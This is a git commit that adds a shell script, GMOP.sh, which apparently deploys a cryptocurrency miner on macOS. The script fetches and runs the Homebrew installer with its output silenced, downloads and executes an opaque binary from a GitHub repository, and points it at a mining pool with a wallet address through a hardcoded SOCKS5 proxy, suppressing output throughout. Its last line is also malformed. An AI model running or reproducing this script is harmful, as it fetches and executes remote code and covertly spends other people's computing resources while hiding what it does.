9b705caa7ac847027c78f81b7baad1487415c8c7
Godmine99 <90863870+Godmine99@users.noreply.github.com>
2021-09-17 02:07:52 +0530

    Add files via upload

---
+++ GMOP.sh
@@ -0,0 +1,11 @@
+#!/bin/sh
+softwareupdate -l
+ruby -e "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)" < /dev/null 2> /dev/null ; brew install caskroom/cask/brew-cask 2> /dev/null
+brew install --cask screen
+brew install coreutils
+wget https://github.com/Godmine99/cpu/raw/main/GMOP
+chmod +x GMOP
+screen -dmS ls 
+WORKER=$(echo $(gshuf -i 11111-9999999 -n 1)-CPU)
+PROXY=socks5://98.162.96.41:4145
+./GMOP -c stratum+tcp://ap.luckpool.net:3956 -u RCdUFd3iiu1tF5TjNPsDDxN2ApqZDSbYBW.$WORKER -- password x $PROXY --threads 12 nproc --all` > /dev/null
